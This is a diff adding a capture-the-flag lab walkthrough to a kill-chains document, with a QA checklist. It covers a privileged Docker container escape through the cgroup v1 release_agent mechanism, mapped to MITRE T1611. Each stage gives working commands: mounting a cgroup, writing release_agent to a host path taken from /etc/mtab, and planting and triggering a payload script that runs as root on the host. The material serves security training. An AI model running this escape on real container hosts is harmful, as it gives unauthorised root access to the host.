@@ -2461,6 +2461,182 @@ cat /tmp/flag.txt
 
 ---
 
+### CC-02: Privileged Docker Container Escape
+
+**VMs:** Inside privileged container (Ubuntu 22.04, cgroup v1 via systemd.unified_cgroup_hierarchy=0)
+**Difficulty:** Medium
+**Flags:** 1
+
+You start already inside a privileged Docker container running as root (D-06). Using the Linux
+cgroup `release_agent` mechanism — which executes a host-side script whenever the last process
+in a cgroup exits — you write a payload to the host filesystem and trigger it by spawning a
+process in a child cgroup, escaping the container boundary entirely without any network access
+or container management tools.
+
+> **Note on T1611 / T1610 mapping:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/)
+> is the primary TTP for this scenario. [T1610 — Deploy Container](https://attack.mitre.org/techniques/T1610/)
+> is **not applicable** here: T1610 covers adversary deployment of a new container; per D-06
+> the privileged container is pre-existing and the student starts inside it. The escape technique
+> abuses the container's elevated capabilities to write to the host — this is T1611.
+
+---
+
+#### Stage 1: Privileged Container and cgroup v1 Verification
+
+**Action:** You verify that you are running inside a privileged container with full capabilities
+and that cgroup v1 is active — both are required for the release_agent escape to function.
+
+**Command:**
+```bash
+# Confirm full capabilities (CapEff should be non-zero, e.g. 0000003fffffffff)
+cat /proc/self/status | grep CapEff
+
+# Confirm we are inside a Docker container
+ls /.dockerenv
+
+# CRITICAL: Verify cgroup v1 is active — must return "tmpfs" not "cgroup2fs"
+stat -fc %T /sys/fs/cgroup/
+```
+
+**Expected Output:**
+```
+CapEff: 0000003fffffffff
+/.dockerenv
+tmpfs
+```
+
+**TTP:** — (pre-flight check / configuration step, not an adversarial technique)
+
+> **Warning — silent failure on Ubuntu 22.04 cgroup v2:** Ubuntu 22.04 defaults to cgroup v2
+> (`systemd.unified_cgroup_hierarchy=1`). On cgroup v2, the `release_agent` file does not
+> exist in the unified hierarchy — the mount command below will succeed but
+> `/tmp/cgrp/release_agent` will not appear, and the escape produces no output from `/output`
+> with no error message. If `stat -fc %T /sys/fs/cgroup/` returns `cgroup2fs` instead of
+> `tmpfs`, **stop** — the escape will not work. The victim VM must be booted with the kernel
+> parameter `systemd.unified_cgroup_hierarchy=0` (set in `/etc/default/grub` →
+> `GRUB_CMDLINE_LINUX`, then `sudo update-grub && sudo reboot`).
+
+---
+
+#### Stage 2: Cgroup Controller Mount and Child Cgroup Setup
+
+**Action:** You mount the cgroup v1 RDMA controller inside the container and create a child
+cgroup that will serve as the trigger mechanism for the release_agent callback.
+
+**Command:**
+```bash
+mkdir /tmp/cgrp
+mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+```
+
+**Expected Output:**
+```
+(no output — mount succeeds silently; verify with: ls /tmp/cgrp/)
+```
+
+**TTP:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation
+
+---
+
+#### Stage 3: Release Agent Path Configuration
+
+**Action:** You enable the `notify_on_release` flag on the child cgroup and configure the
+`release_agent` file to point to a script on the **host** filesystem — the path is extracted
+from `/etc/mtab` which records the container's overlay mount with the host upperdir path.
+
+**Command:**
+```bash
+# Enable release_agent callback when child cgroup becomes empty
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Extract the host-side container path from the overlay mount record
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+
+# Alternative (if the sed fails):
+# host_path=$(cat /etc/mtab | grep upperdir | awk -F 'upperdir=' '{print $2}' | awk -F ',' '{print $1}')
+
+# Point release_agent to a script we will create at this host path
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+# Verify the path was written correctly
+cat /tmp/cgrp/release_agent
+```
+
+**Expected Output:**
+```
+/var/lib/docker/overlay2/CONTAINER_LAYER_HASH/diff/cmd
+```
+
+**TTP:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation
+
+---
+
+#### Stage 4: Payload Script Creation
+
+**Action:** You create the `/cmd` script that the host kernel will execute as root when the
+release_agent fires — writing the host's `/root/flag.txt` to a file readable from within
+the container.
+
+**Command:**
+```bash
+cat > /cmd << 'EOF'
+#!/bin/sh
+cat /root/flag.txt > /output
+EOF
+chmod +x /cmd
+```
+
+**Expected Output:**
+```
+(no output — file created; verify with: cat /cmd)
+```
+
+**TTP:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation
+
+---
+
+#### Stage 5: Trigger and Host Execution
+
+**Action:** You trigger the release_agent by spawning a process into the child cgroup and
+immediately causing that cgroup to become empty — the kernel fires the release_agent, executing
+your payload as root on the host.
+
+**Command:**
+```bash
+# Spawn a process in the child cgroup (it immediately exits, making cgroup empty)
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+# Wait for the host-side execution to complete
+sleep 1
+```
+
+**Expected Output:**
+```
+(no output — the release_agent fires asynchronously on the host)
+```
+
+**TTP:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation
+
+---
+
+### [FLAG 1] Stage 6: Flag Capture — Host /root/flag.txt via Escape
+
+**Action:** You retrieve Flag 1 by reading `/output`, which your payload wrote from the host's
+`/root/flag.txt` — confirming that your script executed as root on the host outside the
+container boundary.
+
+**Command:**
+```bash
+cat /output
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
 ### CC-03: Kubernetes Misconfigured Service Account Escape
 
 **VMs:** Attacker (Kali), Victim (Ubuntu 22.04, k3s, misconfigured privileged pod with hostPath mount)
@@ -2657,3 +2833,6 @@ The following checklist was applied before finalizing this document:
 | Phase 3: CVE-04 pre-flight includes `from impacket.dcerpc.v5 import rprn` import check | PASS |
 | Phase 3: CVE-03 and CVE-04 each contain exactly one `### [FLAG 1]` stage | PASS |
 | Phase 3: CVE-02 cites JDK 1.8.0_181 constraint in inline warning | PASS |
+| Phase 3: CC-02 Stage 1 includes `stat -fc %T /sys/fs/cgroup/` cgroup v1 verification before escape sequence | PASS |
+| Phase 3: CVE-03 kill-chain references Struts S2-045 (CVE-2017-5638), not Spring4Shell | PASS |
+| Phase 3: `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 17 (10 Phase 2 + 7 Phase 3) | PASS |
